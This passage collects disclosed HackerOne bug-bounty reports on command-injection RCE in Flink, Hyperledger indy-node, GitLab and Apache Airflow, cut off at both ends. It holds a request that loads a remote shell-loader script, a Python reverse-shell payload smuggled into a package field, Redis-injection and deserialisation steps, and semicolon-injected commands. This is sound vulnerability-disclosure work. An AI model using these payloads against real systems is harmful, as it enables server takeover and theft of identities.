GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
Host: ████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic █████
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Language: en-US,en;q=0.9,fi;q=0.8
```

## Impact

Attacker can execute commands on the server and use this access to potentially pivot into other resources in the network.

---

### [POOL_UPGRADE request handler may allow an unauthenticated attacker to remotely execute code on every node in the network. ](https://hackerone.com/reports/1705717)

- **Report ID:** `1705717`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** Linux Foundation Decentralized Trust
- **Reporter:** @shakedreiner
- **Bounty:** 2000 usd
- **Disclosed:** 2022-10-20T20:07:54.109Z
- **CVE(s):** CVE-2022-31020

**Vulnerability Information:**

This issue is related to the https://github.com/hyperledger/indy-node. 
The issue was found in the `indy-node` code that handles the write request of type ****`POOL_UPGRADE` (in file** `indy-node/indy_node/server/request_handlers/config_req_handlers/pool_upgrade_handler.py`****).**** 

The `additional_dynamic_validation` function handles an undocumented field called `package` that can contain the name of the package to be upgraded. I case that this field is not empty, it is passed as is to the following functions `self.upgrader.check_upgrade_possible -> NodeControlUtil.curr_pkg_info -> cls._get_curr_info`.

```python
def _get_curr_info(cls, package):
    cmd = compose_cmd(['dpkg', '-s', package])
    return cls.run_shell_command(cmd)
```

As seen in the code snippet above, the user supplied name is then concatenated to the string `dpkg -s` and is run as a system command without any sanitization. 

This can lead to an attacker supplying a package name, followed by a semicolon and another system command (e.g. `package ; whoami`), resulting in a remote code execution. This of course can be any command, and in the PoC code attached I’m running a reverse shell, effectively taking control of the node, and possibly the entire network and the identities in it (assuming I run this exploit on enough nodes).

The documentation specifies that the `POOL_UPGRADE` can be run by a Trustee only, however, we can run this exploit being a client without any roles in the network.

This is made possible by the fact that the authorization that the `POOL_UPGRADE` handler performs, happens only **after** the package information has been fetched (using `self.upgrader.check_upgrade_possible`). Meaning any client can trigger the vulnerable code path and execute code on all the network’s nodes.

### Steps to reproduce:

We’ll provide 2 methods for this, using the testing framework and independently; both are detailed below. The malicious `POOL_UPGRADE` request looks as follows:

```json
{
    "identifier": "6ouriXMZkLeHsuXrN1X1fd",
    "operation": {
        "action": "start",
        "name": "test",
        "package": "a ; python3 -c \'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\"
        172.17 .0 .2\\ ",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\\" / bin / sh\\ ")\'",
        "schedule": {
            "4yC546FFzorLPgTNTc6V43DnpFrR8uHvtunBxb2Suaa2": "2022-12-25T10:25:58.271857+00:00",
            "AtDfpKFe1RPgcr5nnYBw1Wxkgyn8Zjyh5MzFoEUTeoV3": "2022-12-25T10:26:16.271857+00:00",
            "DG5M4zFm33Shrhjj6JB7nmx9BoNJUq219UXDfvwBDPe2": "2022-12-25T10:26:25.271857+00:00",
            "JpYerf4CssDrH76z7jyQPJLnZ1vwYgvKbvcp16AB5RQ": "2022-12-25T10:26:07.271857+00:00"
        },
        "sha256": "db34a72a90d026dae49c3b3f0436c8d3963476c77468ad955845a1ccf7b03f55",
        "type": "109",
        "version": "1.1"
    },
    "protocolVersion": 2,
    "reqId": 1651152851,
    "signature": "4YoXKHNnWRouTUAW4fKuTANnXNJfY2JoPG4PoXfz4PUzjx4NySrAmzkzy6zCiRRf5uczZx5mQVSm1eCZLnUHUDoT"
}
```

A few notes on some important fields:

- `package` - the undocumented field that leads to the security issue. After the semi-colon we have the injected command. In this case, a Python reverse shell (note that you’ll need to change the IP address and port to point to you)
- `schedule` - It’s important only because we need it in order to pass the `static_validation` of this request, just need to set the public nodes and a time in the future.
- `signature` - the request should be properly signed by any identity in the network (no role needed)

**Run using pytest:**

1. `cd indy_node/test/`
2. Drop the `exploit_test.py` file
3. Listen for incoming connection on a different machine (e.g. `ncat -lvvp 4444`)
4. Find the following code in the exploit `s.connect(("172.17.0.2",4444))`, and replace the address and port for your ones
5. Disable the testing patch that replaces the vulnerable function in testing mode using the following command
`sed -i '/def patchNodeControlUtil().*:/{n;s/.*/    yield/}' conftest.py`
6. Run the test and get a reverse shell
`pytest -s exploit_test.py`

**Run independently:**

1. `cd indy_node/test/`
2. Drop the `exploit.py` file
3. Listen for incoming connection on a different machine (e.g. `ncat -lvvp 4444`)
4. Find the following code in the exploit `s.connect(("172.17.0.2",4444))`, and replace the address and port for your ones
5. Replace the `ADDRESS` and `PORT` with your target node details (the node’s **client port**)
6. Replace the `SERVER_KEY` with the ZeroMQ CURVE Public Certificate of your target node (it is public info)
    1. Server key can also be obtained from the genesis file, and converted the same way it’s done here [https://github.com/hyperledger/indy-sdk/blob/master/scripts/test_zmq/src/main.rs](https://github.com/hyperledger/indy-sdk/blob/master/scripts/test_zmq/src/main.rs) or in the `indy-sdk` here `scripts/test_zmq/src/main.rs:136`
7. Run the test and get a reverse shell

## Impact

Breaking the network’s consensus, stealing every identity, getting to run code on all of the nodes.

---

### [Remote Command Execution via Github import](https://hackerone.com/reports/1679624)

- **Report ID:** `1679624`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 33510 usd
- **Disclosed:** 2022-10-06T20:19:24.594Z
- **CVE(s):** CVE-2022-2884

**Vulnerability Information:**

### Summary

This is very similar to https://about.gitlab.com/releases/2022/08/22/critical-security-release-gitlab-15-3-1-released/#Remote%20Command%20Execution%20via%20Github%20import and allows arbitrary redis commands to be injected when imported a GitHub repository.

When importing a GitHub repo the api client uses `Sawyer` for handling the responses. This takes a json hash and converts it into a ruby class that has methods matching all of the keys:

https://github.com/lostisland/sawyer/blob/v0.9.2/lib/sawyer/resource.rb#L106-L110
```ruby
    def self.attr_accessor(*attrs)
      attrs.each do |attribute|
        class_eval do
          define_method attribute do
            @attrs[attribute.to_sym]
          end

          define_method "#{attribute}=" do |value|
            @attrs[attribute.to_sym] = value
          end

          define_method "#{attribute}?" do
            !!@attrs[attribute.to_sym]
          end
        end
      end
    end
```

This happens recursively, and allows for any method to be overridden including built-in methods such as `to_s`.

The redis gem uses `to_s` and `bytesize` to generate the RESP command, so if a `Sawyer::Resource` is ever passed in that has a controllable hash it can allow arbitrary redis commands to be injected into the stream as the string will be shorter than the `$` size provided (see https://redis.io/docs/reference/protocol-spec/)

https://github.com/redis/redis-rb/blob/v4.4.0/lib/redis/connection/command_helper.rb#L20
```ruby
            i = i.to_s
            command << "$#{i.bytesize}"
            command << i
```

The patch for CVE-2022-2884 added validation to `Gitlab::Cache::Import::Caching` but there is another spot where the  `Sawyer::Resource` is passed to redis:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/github_import/importer/repository_importer.rb#L55
```ruby
       def import_repository
          project.ensure_repository

          refmap = Gitlab::GithubImport.refmap
          project.repository.fetch_as_mirror(project.import_url, refmap: refmap, forced: true)

          project.change_head(default_branch) if default_branch

          # The initial fetch can bring in lots of loose refs and objects.
          # Running a `git gc` will make importing pull requests faster.
          Repositories::HousekeepingService.new(project, :gc).execute

          true
        end
```

The `default_branch` param comes from the client repository (which is a nested Sawyer::Resource of attacker controlled data), and is passed to `change_head`  which then calls `branch_exists?`  and `branch_names_include?` which passes the value to redis:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.3.1-ee/lib/gitlab/repository_cache_adapter.rb#L71
```ruby
        define_method("#{name}_include?") do |value|
          ivar = "@#{name}_include"
          memoized = instance_variable_get(ivar) || {}
          lookup = proc { __send__(name).include?(value) } # rubocop:disable GitlabSecurity/PublicSend

          next memoized[value] if memoized.key?(value)

          memoized[value] =
            if strong_memoized?(name)
              lookup.call
            else
              result, exists = redis_set_cache.try_include?(name, value)

              exists ? result : lookup.call
            end

          instance_variable_set(ivar, memoized)[value]
        end
```

So by returning an api response with a `default_branch` that overrides `to_s` and `bytesize` you can call arbitrary redis commands:

```json
        {
            "default_branch": {
                "to_s": {
                    "to_s": 'ggg\r\nINJECT_RESP_HERE',
                    "bytesize": 3,
                }
            }
        }
```

This can be combined with a call to `Marshal.load` when loading a _gitlab_session to execute a deserialisation gadget (such as https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html) and gain RCE.

### Steps to reproduce

1. edit {F1882976} and change the command at `git_set`, that will be the command that is executed
1. change the `session:gitlab:gggg`  to be something other than `gggg`
1. run `ruby ./gen_payload3.rb` and copy the payload
1. edit {F1882972} and update the payload
1. run `ngrok http 5000` and copy the url
1. edit `fake_server3.py` and update the ngrok url
1. run the server with `FLASK_APP=fake_server3.py flask run`
1. run `curl --request POST --url "http://gitlab.wbowling.info/api/v4/import/github"  --header "content-type: application/json" --header "PRIVATE-TOKEN: API_TOKEN" --data "{\"personal_access_token\": \"fake_token\",\"repo_id\": \"12345\",\"target_namespace\": \"root\",\"new_name\": \"gh-import-$RANDOM\",\"github_hostname\": \"https://9895-45-248-49-157.ngrok.io\"}"` replacing `gitlab.wbowling.info` with your gitlab url, `API_TOKEN` with a valid gitlab token, `target_namespace` with a namespace you have access to, and `github_hostname` with your ngrok url
1. wait a minute or so, you should see requests coming in to the flask app. Once you see a request for `/api/v3/repos/fake/name` that should be long enough, there will also be an error in `/var/log/gitlab/gitlab-rails/exceptions_json.log` about `comparison of String with 0 failed`
1. run `curl -v 'http://gitlab.wbowling.info/root' -H 'Cookie: _gitlab_session=gggg'` replacing `gitlab.wbowling.info` with your gitlab url and `gggg` with the string you used in `gen_payload3.rb`
1. the payload should have executed

### Impact

Allows an attacker with the ability to import a github repo to execute arbitrary commands on the server

### Examples

See attached scripts and steps to reproduce

### What is the current *bug* behavior?

The `Sawyer::Resource` object is passed around and allows an attacker to override builtin methods

### What is the expected *correct* behavior?

The `Sawyer::Resource` has a `to_h` method which could potentially be used to ensure a plain has it passed around.

### Relevant logs and/or screenshots
redis command ends up as:
```
[pid  1362] read(67, "*1\r\n$5\r\nmulti\r\n*3\r\n$9\r\nsismember\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n$3\r\nggg\r\n*3\r\n$3\r\nset\r\n$19\r\nsession:gitlab:jjjj\r\n$330\r\n\4\10[\10c\25Gem::SpecFetcherc\23Gem::InstallerU:\25Gem::Requirement[\6o:\34Gem::Package::TarReader\6:\10@ioo:\24Net::BufferedIO\7;\7o:#Gem::Package::TarReader::Entry\7:\n@readi\0:\f@headerI\"\10aaa\6:\6ET:\22@debug_outputo:\26Net::WriteAdapter\7:\f@socketo:\24Gem::RequestSet\7:\n@setso;\16\7;\17m\vKernel:\17@method_id:\vsystem:\r@git_setI\"\33echo id > /tmp/vakzz22\6;\fT;\22:\fresolve\r\n*2\r\n$6\r\nexists\r\n$53\r\ncache:gitlab:branch_names:root/gh-import-7316:102:set\r\n*1\r\n$4\r\nexec\r\n", 16384) = 570
```

error in the logs
```json
{"severity":"ERROR","time":"2022-08-25T03:57:55.006Z","correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","exception.class":"ArgumentError","exception.message":"comparison of String with 0 failed","exception.backtrace":["lib/gitlab/set_cache.rb:60:in `block in try_include?'","lib/gitlab/redis/wrapper.rb:23:in `block in with'","lib/gitlab/redis/wrapper.rb:23:in `with'","lib/gitlab/set_cache.rb:74:in `with'","lib/gitlab/set_cache.rb:59:in `try_include?'","lib/gitlab/repository_cache_adapter.rb:71:in `block in cache_method_as_redis_set'","app/models/repository.rb:288:in `branch_exists?'","app/models/repository.rb:1161:in `change_head'","app/models/concerns/has_repository.rb:17:in `change_head'","lib/gitlab/github_import/importer/repository_importer.rb:55:in `import_repository'","lib/gitlab/github_import/importer/repository_importer.rb:37:in `execute'","app/workers/gitlab/github_import/stage/import_repository_worker.rb:31:in `import'","app/workers/concerns/gitlab/github_import/stage_methods.rb:37:in `try_import'","app/workers/concerns/gitlab/github_import/stage_methods.rb:20:in `perform'","lib/gitlab/database/load_balancing/sidekiq_server_middleware.rb:26:in `call'","lib/gitlab/sidekiq_middleware/duplicate_jobs/strategies/until_executing.rb:16:in `perform'","lib/gitlab/sidekiq_middleware/duplicate_jobs/duplicate_job.rb:58:in `perform'","lib/gitlab/sidekiq_middleware/duplicate_jobs/server.rb:8:in `call'","lib/gitlab/sidekiq_middleware/worker_context.rb:9:in `wrap_in_optional_context'","lib/gitlab/sidekiq_middleware/worker_context/server.rb:19:in `block in call'","lib/gitlab/application_context.rb:110:in `block in use'","lib/gitlab/application_context.rb:110:in `use'","lib/gitlab/application_context.rb:52:in `with_context'","lib/gitlab/sidekiq_middleware/worker_context/server.rb:17:in `call'","lib/gitlab/sidekiq_status/server_middleware.rb:7:in `call'","lib/gitlab/sidekiq_versioning/middleware.rb:9:in `call'","lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `block in call'","lib/gitlab/database/query_analyzer.rb:37:in `within'","lib/gitlab/sidekiq_middleware/query_analyzer.rb:7:in `call'","lib/gitlab/sidekiq_middleware/admin_mode/server.rb:14:in `call'","lib/gitlab/sidekiq_middleware/instrumentation_logger.rb:9:in `call'","lib/gitlab/sidekiq_middleware/batch_loader.rb:7:in `call'","lib/gitlab/sidekiq_middleware/extra_done_log_metadata.rb:7:in `call'","lib/gitlab/sidekiq_middleware/request_store_middleware.rb:10:in `block in call'","lib/gitlab/with_request_store.rb:17:in `enabling_request_store'","lib/gitlab/with_request_store.rb:10:in `with_request_store'","lib/gitlab/sidekiq_middleware/request_store_middleware.rb:9:in `call'","lib/gitlab/sidekiq_middleware/server_metrics.rb:76:in `block in call'","lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `block in instrument'","lib/gitlab/metrics/background_transaction.rb:33:in `run'","lib/gitlab/sidekiq_middleware/server_metrics.rb:103:in `instrument'","lib/gitlab/sidekiq_middleware/server_metrics.rb:75:in `call'","lib/gitlab/sidekiq_middleware/monitor.rb:10:in `block in call'","lib/gitlab/sidekiq_daemon/monitor.rb:49:in `within_job'","lib/gitlab/sidekiq_middleware/monitor.rb:9:in `call'","lib/gitlab/sidekiq_middleware/size_limiter/server.rb:13:in `call'","lib/gitlab/sidekiq_logging/structured_logger.rb:21:in `call'"],"user.username":"root","tags.program":"sidekiq","tags.locale":"en","tags.feature_category":"importers","tags.correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","extra.sidekiq":{"retry":5,"queue":"github_importer:github_import_stage_import_repository","version":0,"queue_namespace":"github_importer","dead":false,"memory_killer_memory_growth_kb":50,"memory_killer_max_memory_growth_kb":300000,"status_expiration":1800,"args":["[FILTERED]"],"class":"Gitlab::GithubImport::Stage::ImportRepositoryWorker","jid":"f6fd0ce785d6cc8e91b5b776","created_at":1661399872.1377518,"correlation_id":"01GB9JCB7TYNH6F7J7W7NFQTDT","meta.caller_id":"RepositoryImportWorker","meta.remote_ip":"192.168.0.149","meta.feature_category":"importers","meta.user":"root","meta.project":"root/gh-import-7316","meta.root_namespace":"root","meta.client_id":"user/1","meta.root_caller_id":"POST /api/:version/import/github","worker_data_consistency":"always","idempotency_key":"resque:gitlab:duplicate:github_importer:github_import_stage_import_repository:797f481f035041a27c840a58899f1557fc2a102dfc05bc2cb918651c86da1219","size_limiter":"validated","enqueued_at":1661399872.1395159},"extra.import_type":"github","extra.project_id":102,"extra.source":"Gitlab::GithubImport::Stage::ImportRepositoryWorker"}
```


### Output of checks

#### Results of GitLab environment info

```
System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.5p203
Gem Version:	3.1.6
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.4.0
Go Version:	unknown

GitLab information
Version:	15.3.1-ee
Revision:	518311979e3
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.10
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.10.0
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

## Impact

Allows an attacker with the ability to import a github repo to execute arbitrary commands on the server

---

### [CVE-2022-38362: Apache Airflow Docker Provider <3.0 RCE vulnerability in example dag](https://hackerone.com/reports/1671140)

- **Report ID:** `1671140`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** Internet Bug Bounty
- **Reporter:** @x_h1
- **Bounty:** - usd
- **Disclosed:** 2022-09-23T17:16:36.855Z
- **CVE(s):** CVE-2022-38362

**Vulnerability Information:**

Apache Airflow Docker's Provider shipped with an example DAG that was vulnerable to (authenticated) remote code exploit of code on the Airflow worker host.

##Vulnerability summary:
In DAG script of airflow 2.3.3, there is a command injection vulnerability (RCE) in the script (example_docker_copy_data.py of docker provider), which can obtain the permission of the operating system. 

source path: 
airflow-2.3.3/airflow/providers/docker/example_dags/example_docker_copy_data.py

##Vulnerability details：
(1) Vulnerability principle：
1. It can be seen from the source code of  example_docker_copy_data.py script that there is the function of executing bash command, The parameter ‘source_location’ in the template expression {{params.source_location}} is externally controllable and rendered through the jiaja2 template: 

{F1869746}

2. Further analysis “from airflow.operators.bash import BashOperator” code, we can see bash_command parameter value will be executed as a bash script;

{F1869748}

(2)Vulnerability exploit：
1. Enter the DAGs menu and start docker_sample_copy_data task, select “Trigger DAG w/ config”. 

http://192.168.3.17:8080/trigger?dag_id=docker_sample_copy_data

{F1869749}

2. To construct payload, we can separate commands with ‘;’, so as to inject any operating system commands to be executed(RCE).

{F1869750}

PAYLOAD：```{"source_location":";touch /tmp/thisistest;"}```, Then click trigger to execute the task.

{F1869755}

The final command is as follows:
```locate_file_cmd = “”” sleep 10
find ;touch /tmp/thisistest; -type f -printf “%f\n” | head -1
“””
```

Through the log and server view, it can be seen that arbitrary command has been executed successfully.

{F1869756}

{F1869757}

## Impact

An attacker can execute arbitrary commands on the airflow host.

**Summary (team):**

CVE-2022-38362: Apache Airflow Docker Provider <3.0 RCE vulnerability in example dag

Description:

Apache Airflow Docker's Provider shipped with an example DAG that was
vulnerable to (authenticated) remote code exploit of code on the
Airflow worker host.

Mitigation:

Disable loading of example DAGs or upgrade the
apache-airflow-providers-docker to 3.0.0 or above

Credit:

Thanks to Kai Zhao of 3H Secruity Team for reporting this

Security Advisory: https://lists.apache.org/thread/614p38nf4gbk8xhvnskj9b1sqo2dknkb

---

### [RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)](https://hackerone.com/reports/1609965)

- **Report ID:** `1609965`
- **Severity:** Critical
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @vakzz
- **Bounty:** 33510 usd
- **Disclosed:** 2022-09-13T04:40:52.091Z
- **CVE(s):** CVE-2022-2185

**Vulnerability Information:**

### Summary

The `DecompressedArchiveSizeValidator` is used to check the size of a archive before extracting it:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/decompressed_archive_size_validator.rb#L82
```ruby
      def command
        "gzip -dc #{@archive_path} | wc -c"
      end

   def validate
        pgrp = nil
        valid_archive = true

        Timeout.timeout(TIMEOUT_LIMIT) do
          stdin, stdout, stderr, wait_thr = Open3.popen3(command, pgroup: true)
          stdin.close
```

Since `command` is a string and passed directly to `Open3.popen3` it will be interpreted as a shell command, so if `archive_path` contains any special characters it can be used to run arbitrary commands.

One of the places that the `DecompressedArchiveSizeValidator` is used is in the [Gitlab::ImportExport::FileImporter](https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/file_importer.rb#L110),

```ruby
     def size_validator
        @size_validator ||= DecompressedArchiveSizeValidator.new(archive_path: @archive_file)
      end
```

It gets `@archive_file` from  the constructor, and is used by the [Gitlab::ImportExport::Importer](https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/importer.rb#L48) which gets it from `project.import_source`.

Under normal circumstances `import_source` is nil and is generated by the `FileImporter` using `@archive_file = File.join(@shared.archive_path, Gitlab::ImportExport.export_filename(exportable: @importable))`.

Most of the places I've checked do not allow you to set the `import_source` for a project, or have the `import_type` set to something other than `gitlab_project` or `gitlab_custom_project_template` (which is required to use the `::Gitlab::ImportExport::Importer`).

There is one place though, in the `BulkImports::Projects::Pipelines::ProjectPipeline`. Luckily this is disabled by default as it requires the `bulk_import_projects` feature to be enabled. If/once this feature is enabled, it's possible to trigger the above flow.

This is possible as the two transformer on the `ProjectPipeline` are `:BulkImports::Common::Transformers::ProhibitedAttributesTransformer` and `::BulkImports::Projects::Transformers::ProjectAttributesTransformer`,  which first removes a list of prohibited keys:

```ruby
PROHIBITED_REFERENCES = Regexp.union(
          /\Acached_markdown_version\Z/,
          /\Aid\Z/,
          /_id\Z/,
          /_ids\Z/,
          /_html\Z/,
          /attributes/,
          /\Aremote_\w+_(url|urls|request_header)\Z/ # carrierwave automatically creates these attribute methods for uploads
        ).freeze
```

And then sets a few other values:
```ruby
          entity = context.entity
          visibility = data.delete('visibility')

          data['name'] = entity.destination_name
          data['path'] = entity.destination_name.parameterize
          data['import_type'] = PROJECT_IMPORT_TYPE
          data['visibility_level'] = Gitlab::VisibilityLevel.string_options[visibility] if visibility.present?
          data['namespace_id'] = Namespace.find_by_full_path(entity.destination_namespace)&.id if entity.destination_namespace.present?

          data.transform_keys!(&:to_sym)
```

All of the other params are allowed and passed directly into `project = ::Projects::CreateService.new(context.current_user, data).execute`. The first thing the create service does its to check if it's creating from a template, and if so the `CreateFromTemplateService` is used instead:

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/app/services/projects/create_service.rb#L25-27
```ruby
    def execute
     if create_from_template?
        return ::Projects::CreateFromTemplateService.new(current_user, params).execute
      end
    # ...
    end

    def create_from_template?
      @params[:template_name].present? || @params[:template_project_id].present?
    end
```

Since we control all of the params, this path can be triggered by setting `template_name` to a valid template such as `rails`.  This then uses the `GitlabProjectsImportService` which allows the `import_type` to be changed from `gitlab_project_migration` to `gitlab_project`.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/app/services/projects/gitlab_projects_import_service.rb#L61-76
```ruby
    def prepare_import_params
      data = {}
      data[:override_params] = @override_params if @override_params

      if overwrite_project?
        data[:original_path] = params[:path]
        params[:path] += "-#{tmp_filename}"
      end

      if template_file
        data[:sample_data] = params.delete(:sample_data) if params.key?(:sample_data)
        params[:import_type] = 'gitlab_project'
      end

      params[:import_data] = { data: data } if data.present?
    end
```

The `Projects::CreateService` service is then called again with the updated `import_type`, but the rest of our params the same. This causes the `import_schedule` to happen as `@project.gitlab_project_migration?` is no longer true

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/app/services/projects/create_service.rb#L276-282
```ruby
    def import_schedule
      if @project.errors.empty?
        @project.import_state.schedule if @project.import? && !@project.bare_repository_import? && !@project.gitlab_project_migration?
      else
        fail(error: @project.errors.full_messages.join(', '))
      end
    end
```

If a custom `import_source` was used, it will be used as the `@archive_file` for the `Gitlab::ImportExport::FileImporter`.  After `wait_for_archived_file` has reached `MAX_RETRIES` (it continues instead of failing) then `validate_decompressed_archive_size` will be called and then `Open3.popen3` with a controllable string.

https://gitlab.com/gitlab-org/gitlab/-/blob/v15.1.0-ee/lib/gitlab/import_export/file_importer.rb#L45

```ruby
       wait_for_archived_file do
          validate_decompressed_archive_size if Feature.enabled?(:validate_import_decompressed_archive_size)
          decompress_archive
        end

      def wait_for_archived_file
        MAX_RETRIES.times do |retry_number|
          break if File.exist?(@archive_file)

          sleep(2**retry_number)
        end

        yield
      end
```

### Steps to reproduce

1. spin up a gitlab instance
1. ssh in and enable bulk project imports with from a rails console: `sudo gitlab-rails console` then `::Feature.enable(:bulk_import_projects)`
1. start watching the logs with `sudo gitlab-ctl tail`
1. create an api token
1. create a new group
1. create a new project in that group
1. download {F1785226} and change `PROJECT_PATH` to the full path of the project above and `PROJECT_ID` to its id
1. change `"import_source":"/tmp/ggg;echo lala|tee /tmp/1234;#",` to be your custom command (it cannot contain `>` as json will convert it to `\u003c`)
1. (optional) remove `proxies={"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}` if you are not using burp/another proxy
1. run it with `FLASK_APP=api_project_ql.py flask run`
1. start ngrok with `ngrok http 5000`
1.  go to new group -> import group
1. enter the ngrok http address and your token from above in the `Import groups from another instance of GitLab` section
1. select the group created above, change the parent to `No parent` and choose a new group name
1. hit import
1. you should see requests being made, then after the project is imported and the `wait_for_archived_file` has timed out (takes a few minutes) you should see something like following error in the logs and the payload will execute:

```
command exited with error code 2: tar (child): /tmp/ggg;echo lala|tee /tmp/1234;#: Cannot open: No such file or directory
tar (child): Error is not recoverable: exiting now
tar: Child returned status 2
tar: Error is not recoverable: exiting now
```

```bash
vagrant@gitlab:~$ cat /tmp/1234
lala
vagrant@gitlab:~$
```

### Impact

If the `bulk_import_projects` feature is enabled, allows an attacker to execute arbitrary commands on a gitlab server


### What is the current *bug* behavior?
* The `DecompressedArchiveSizeValidator` passes a string to `popen` that can contain attacker controlled data
* The `ProjectPipeline` does not correctly filter the project params

### What is the expected *correct* behavior?
* The `DecompressedArchiveSizeValidator` should use `Gitlab::Popen` and the command should be an array of strings
* The `ProjectPipeline` should use the `Gitlab::ImportExport::AttributeCleaner` or just have a whitelist of allowed params

### Relevant logs and/or screenshots

```json
{
    "severity": "ERROR",
    "time": "2022-06-23T01:52:57.556Z",
    "correlation_id": "0d72e54e82938b4b82aa3dcafe6c4dfe",
    "exception.class": "Gitlab::ImportExport::Error",
    "exception.message": "command exited with error code 2: tar (child): /tmp/ggg;echo lala|tee /tmp/1234;#: Cannot open: No such file or directory\ntar (child): Error is not recoverable: exiting now\ntar: Child returned status 2\ntar: Error is not recoverable: exiting now",
    "user.username": "vakzz",
    "tags.program": "sidekiq",
    "tags.locale": "en",
    "tags.feature_category": "importers",
    "tags.correlation_id": "0d72e54e82938b4b82aa3dcafe6c4dfe",
    "extra.sidekiq": {
        "retry": false,
        "queue": "repository_import",
        "version": 0,
        "backtrace": 5,
        "dead": false,
        "status_expiration": 86400,
        "memory_killer_memory_growth_kb": 50,
        "memory_killer_max_memory_growth_kb": 300000,
        "args": [
            "31"
        ],
        "class": "RepositoryImportWorker",
        "jid": "9d28590a58ec7db944453edc",
        "created_at": 1655948922.4369478,
        "correlation_id": "0d72e54e82938b4b82aa3dcafe6c4dfe",
        "meta.user": "vakzz",
        "meta.client_id": "user/2",
        "meta.caller_id": "BulkImports::PipelineWorker",
        "meta.remote_ip": "192.168.0.144",
        "meta.feature_category": "importers",
        "meta.root_caller_id": "Import::BulkImportsController#create",
        "meta.project": "imported_13/export_project",
        "meta.root_namespace": "imported_13",
        "worker_data_consistency": "always",
        "idempotency_key": "resque:gitlab:duplicate:repository_import:e64a87ccd733ff3c9b12cd20d98ea1d44a21196e9d0398c0af668ee84bf77358",
        "size_limiter": "validated",
        "enqueued_at": 1655948922.442958
    },
    "extra.importer": "Import/Export",
    "extra.exportable_id": 31,
    "extra.exportable_path": "imported_13/export_project",
    "extra.import_jid": null
}
```

### Output of checks
#### Results of GitLab environment info

```
System information
System:		Ubuntu 20.04
Proxy:		no
Current User:	git
Using RVM:	no
Ruby Version:	2.7.5p203
Gem Version:	3.1.4
Bundler Version:2.3.15
Rake Version:	13.0.6
Redis Version:	6.2.7
Sidekiq Version:6.4.0
Go Version:	unknown

GitLab information
Version:	15.1.0-ee
Revision:	31c24d2d864
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	12.10
URL:		http://gitlab.wbowling.info
HTTP Clone URL:	http://gitlab.wbowling.info/some-group/some-project.git
SSH Clone URL:	git@gitlab.wbowling.info:some-group/some-project.git
Elasticsearch:	no
Geo:		no
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.7.4
Repository storage paths:
- default: 	/var/opt/gitlab/git-data/repositories
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

## Impact

If the `bulk_import_projects` feature is enabled, allows an attacker to execute arbitrary commands on a gitlab server.

---

### [Path traversal, to RCE](https://hackerone.com/reports/733072)

- **Report ID:** `733072`
- **Severity:** High
- **Weakness:** Command Injection - Generic
- **Program:** GitLab
- **Reporter:** @saltyyolk
- **Bounty:** 12000 usd
- **Disclosed:** 2022-06-07T14:16:59.027Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
This one is similar to #732330 but much simpler.
A path traversal issue in GitLab package registry API allow an attacker to write any file at any location writable to user git in a GitLab server.

### Steps to reproduce

1. Enable package registry in your GitLab instance.
2. Create a project (package registry is enabled by default)
3. Create a private token to call the API
4. Send the following request

```
